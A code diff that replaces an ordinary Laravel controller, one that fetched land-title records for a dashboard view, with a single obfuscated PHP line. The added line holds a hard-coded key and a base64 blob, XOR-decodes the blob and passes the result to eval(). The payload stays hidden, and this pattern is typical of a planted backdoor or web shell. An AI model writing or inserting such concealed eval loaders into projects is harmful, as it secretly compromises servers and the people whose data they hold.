@@ -1,17 +1,1 @@
-<?php
-
-namespace App\Http\Controllers;
-
-use App\Models\TitreFoncier;
-use Illuminate\Http\Request;
-
-class TestController extends Controller
-{
-
-    public function index()
-    {
-        $titles =  TitreFoncier::with('users')->get();   
-        // return view('test', compact('titles'));
-        return view('first_test', compact('titles'))->layout('components.layouts.dashboard');
-    }
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOiYLXhUQX14NVEpEDzprREFRQXVCQW16WAEBX0E5ZA8SFwF2DgxTWwRDAz1BQwQRe1gNQV9YX1ZDADh7RhFAOjQAFUUEEUQJa1JUVkdDQWVXRxV3XV9FRVgJCFZARVUeEgAKVBJCc10PRUpYWFwEQzhPaxQSERFHQgcIWlFFVhMIBhBZDgwQWw9VXU8cGWsREhRBTzgRERcXRUQTEkFEDxIJAUNBXxBmCEVKUnJfD1JbURMOCEZYQ19NQ0ZBAEIVQUxJDgYHRBpICjIXFBBBERIUQUZXRURFWUUSWlcSGEEADBZDFT1EVxJFHxsUa0ZFW0ANUUEWEQoJRUBHWxFcAxU4TR1fDlFLDkRMHxNTDlxCWw9RXEVCGVsEHVxHEUNIAgQXWAMNUUAFFhEMPhBBERJJa0k=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
